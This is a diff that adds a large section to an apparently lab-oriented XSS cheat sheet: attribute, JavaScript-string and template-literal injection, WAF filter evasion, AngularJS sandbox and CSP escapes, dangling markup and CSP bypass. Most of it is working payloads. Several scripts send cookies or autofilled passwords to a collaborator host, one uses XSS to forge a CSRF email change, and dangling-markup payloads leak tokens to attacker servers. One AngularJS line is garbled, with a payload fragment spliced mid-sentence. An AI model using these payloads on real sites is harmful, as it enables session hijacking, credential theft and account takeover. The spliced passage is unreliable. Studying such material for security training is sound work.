@@ -176,3 +176,180 @@ But oftenly angle brackets are filtrated, but sometimes we have possibility to c
 ```
 " autofocus onfocus=alert(document.domain) x="
 ```
+Sometimes XSS vecotr appears inside an element which could be used for XSS itself. For example in `href` element:
+```
+<a href="javascript:alert(document.domain)">
+```
+Some sites block angle brackets but still allow attribute injection. In such case we can use attributes such as `accesskey` which will fire up script after pressing some button  
+So we can simply add nexxt payload to URL:
+```
+?'accesskey='x'onclick='alert(1)
+```
+
+### XSS in JavaScript
+In the simplest case we can just terminate previous script and add our own:
+```
+</script><img src=1 onerror=alert(document.domain)>
+```
+
+Breaking out of JS string:
+```
+'-alert(document.domain)-'
+';alert(document.domain)//
+\';alert(document.domain)//
+```
+Last payload is used when single-quote is escaped with \  
+Often WAFs restrict characters with only whitelisted ones. In such case we can use `onerror` event and `throw 1` to creat4e error  
+```
+onerror=alert;throw 1
+```
+```
+<script>{onerror=alert}throw 1337</script>
+<script>throw onerror=alert,'some string',123,'haha'</script>
+<script>{onerror=eval}throw'=alert\x281337\x29'</script> - \x28 and \x29 replace ()
+<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
+<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
+```
+If we see that some unction takes some parameters from URL (for example for 'back' button), we can insert into URL code with & operator:
+```
+&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window%2b'',{x:'
+```
+
+### Making use of HTML-encoding
+Sometimes app could decode fromn HTML our paylaod and if special characters are blocked, we can try to use:
+```
+&apos;-alert(document.domain)-&apos;
+and it's decoding into:
+'-alert(document.domain)-'
+```
+For example we can insert such payload in website field, which is then reflected in onclick payload:
+```
+http://foo?&apos;-alert(1)-&apos;
+```
+### XSS in JS template literals
+JS template literals are strings literals with embeded JS expressions. They are encapsulatet in backticks and JS expressions inside of them are identified using `${...}` syntax:
+```
+document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
+```
+In such context we can insert XSS simply using `${}` syntax.  
+```
+${alert(document.domain)}
+```
+## Client-side template injection
+CSTI occurs when site uses templates to dynamically parse user's input.  
+### AngularJS sandbox
+AJS sandbox prevents access to potentially dangerous objects such as `window` and `document` or properties such as `__proto__`  
+Sandbox works by parsing user's input, rewriting JS and checking if it contains any dangerous funcs. For example `ensureSafeObject()` func checks does object references itself.  
+The `ensureSafeMemberName()` function checks each property access of the object and, if it contains dangerous properties such as `__proto__` or `__lookupGetter__`, the object will be blocked. The `ensureSafeFunction()` function prevents `call(), apply(), bind(), or constructor()` from being called.  
+One of the most comon ways is to "fool" AngularJs `isIdent()` function. It compares single characters, but we can put to the input multiple characters that will be always less then single character and function will be fooled, so from that point we can insert XSS.
+```
+'a'.constructor.prototype.charAt=[].join
+```
+`charAt` and `join` are used to put multiple characters to `isIdent()` check  
+We need to use `$eval()` function to overwrite `charAt()` function.  
+
+### More complicated ways
+Some sites will restrict some characters and in such case we will need more complicated ways to escape sandbox.  
+If site blocks quotes, we will need `String.fromCharCode()` function to generate needed chars.  
+If `$eval()` function is blocked, we need to use `orderBy` filter. Syntax:
+```
+[123]|orderBy:'Some string'
+```
+`|` symbol is used not for `OR` operation, but f
+1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toStror filtering  
+Some string here could be a paylaod which we will use in place of `eval()` func  
+Example of payload:
+```
+1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+```
+Here numbers are UTF-16 encoded symbols for `x=alert(1)`
+
+### AJS CSP
+CSP mode blocks `Function` constructor, so standard sandbox escape won't work.  
+AJS CSP blocks some JS events and sets own events which will appear in place of original ones  
+AJS defines `$event` object which could be used for CSP bypass. On Chrome object `$event/event` always has array of objects which cause event to be executed. The last is always `window` object which could be used for sandbox escape in combination with `orderBy` filter.  
+```
+<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
+```
+`from()` is used to convert an object to array and execute function on all objects inside array.  
+Another examples:
+```
+<input id=x ng-focus=$event.path|orderBy:'CSS&&[1].map(alert)'> 
+<input id=x ng-focus=$event.path|orderBy:'x&&[1].map(alert)'> 
+<input id=x ng-focus=$event.path|orderBy:'[alert].pop()(1)'>
+<input id=x ng-focus=$event.path|orderBy:'[alert][0](1)'>
+<input id=x ng-focus=$event.path|orderBy:'(y=alert)(1)'>
+For Chrome 109+:
+<input id=x ng-focus=$event.composedPath()|orderBy:'(y=alert)(1)'>
+```
+## Exploiting XSS vulns (more then alert(1))
+### Stealing cookies
+```
+<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+```
+### Capture passwords
+Works only if user uses auto-fill with password managers  
+```
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+### XSS to CSRF
+For example we can force user to change their e-mail using XSS and CSRF vuln:
+```
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+```
+## Dangling markup injection
+DMI occurs when we can't finish full XSS attack, but can exploit some basic functionality. From this point we can execute cross-domain interaction.
+```
+"><img src='//attacker-website.com?
+```
+Here src of image is not ending, but lefts 'dangling'.  
+Because of this, browser will send everything before next single-quote to attacker's server.  
+Potentially it could contain sensitive data.  
+To gain csrf token:
+```
+<script>
+if(window.name) {
+		new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
+		} else {
+     			location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
+}
+</script>
+```
+OR
+```
+<script>
+location='https://0a3a006c041ba288822ff20900fa00c8.web-security-academy.net/my-account?email="></form><form%20class="login-form"%20name="evil-form"%20action="https://exploit-0aad00e50419a26982bdf14301f9006c.exploit-server.net/log"%20method="GET"><button%20class="button"%20type="submit">%20Click%20me%20</button>';
+</script>
+```
+We can generate CSRF PoC from Burp Suite to perform CSRF attacks  
+Use erquest which we want to be CSRF'd and click Engagement Tools - CSRF PoC.  
+The use CSRF PoC script with previous XSS script on exploit server and deliver it to victim.  
+
+## Bypassing CSP
+If we see that website reflects our input into CSP policy (commonly in `report-uri` directive), we can add our own policy with semicolon.  
+Also we can try to override script-src-elem directive in Chrome.  
+```
+<script>alert()</script>&token=;script-src-elem 'unsafe-inline'
+```
